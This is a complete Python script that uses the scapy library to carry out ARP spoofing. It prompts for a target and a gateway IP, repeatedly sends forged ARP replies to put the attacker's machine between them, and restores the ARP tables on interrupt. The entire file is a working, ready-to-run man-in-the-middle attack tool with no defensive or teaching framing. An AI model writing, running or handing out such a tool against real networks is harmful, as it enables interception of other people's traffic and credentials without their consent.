import scapy.all as scapy
import time
import sys
import os


#Check for root privileges
if os.geteuid() != 0:
    print("\033[91m[-] This script must be run with sudo/root privileges.\033[0m")
    print("\033[93m[*] Run: sudo python3 arp_spoof.py\033[0m")
    sys.exit(1)


G = "\033[92m"
Y = "\033[93m"
R = "\033[91m"
C = "\033[96m"
W = "\033[0m"


def get_mac(ip):
    ans = scapy.srp(
        scapy.Ether(dst="ff:ff:ff:ff:ff:ff") /
        scapy.ARP(pdst=ip),
        timeout=1,
        verbose=False
    )[0]

    return ans[0][1].hwsrc if ans else None


def spoof(target_ip, spoof_ip):
    mac = get_mac(target_ip)

    if mac:
        packet = scapy.Ether(dst=mac) / scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=mac,
            psrc=spoof_ip
        )

        scapy.sendp(packet, verbose=False)


def restore(destination_ip, source_ip):
    dst_mac = get_mac(destination_ip)
    src_mac = get_mac(source_ip)

    if dst_mac and src_mac:
        packet = scapy.Ether(dst=dst_mac) / scapy.ARP(
            op=2,
            pdst=destination_ip,
            hwdst=dst_mac,
            psrc=source_ip,
            hwsrc=src_mac
        )

        scapy.sendp(packet, count=4, verbose=False)


print(C + "\n[*] ARP Spoofing" + W)

target_ip = input(Y + "[?] Target IP: " + W)
gateway_ip = input(Y + "[?] Gateway IP: " + W)

print(C + "\n[*] Starting ARP spoofing..." + W)
print(Y + "[*] Press CTRL+C to stop\n" + W)

try:
    count = 0

    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)

        count += 2

        print(
            G + f"\r[+] Packets sent: {count}" + W,
            end=""
        )

        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print(R + "\n\n[-] Restoring ARP tables..." + W)

    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

    print(G + "[+] ARP tables restored." + W)
